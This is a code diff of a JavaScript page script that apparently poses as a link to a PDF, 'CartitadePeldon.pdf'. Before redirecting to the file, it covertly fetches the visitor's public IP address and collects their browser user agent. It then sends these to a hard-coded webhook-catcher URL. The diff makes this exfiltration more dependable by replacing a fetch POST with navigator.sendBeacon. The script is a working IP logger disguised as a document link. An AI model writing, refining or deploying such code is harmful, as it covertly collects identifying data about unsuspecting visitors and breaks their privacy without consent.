@@ -10,12 +10,12 @@
 const destino = "CartitadePeldon.pdf";
 const webhook = "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd";
 
-let ip = "desconocida";
+let ip = "unknown";
 
 try {
-    const ipdata = await fetch("https://api.ipify.org?format=json");
-    const ipjson = await ipdata.json();
-    ip = ipjson.ip;
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    ip = j.ip;
 } catch(e){}
 
 const data = {
@@ -25,13 +25,9 @@ const data = {
     userAgent: navigator.userAgent
 };
 
-fetch(webhook,{
-    method:"POST",
-    headers:{
-        "Content-Type":"application/json"
-    },
-    body:JSON.stringify(data)
-}).catch(()=>{});
+const blob = new Blob([JSON.stringify(data)], {type : 'application/json'});
+
+navigator.sendBeacon(webhook, blob);
 
 window.location.replace(destino);
 
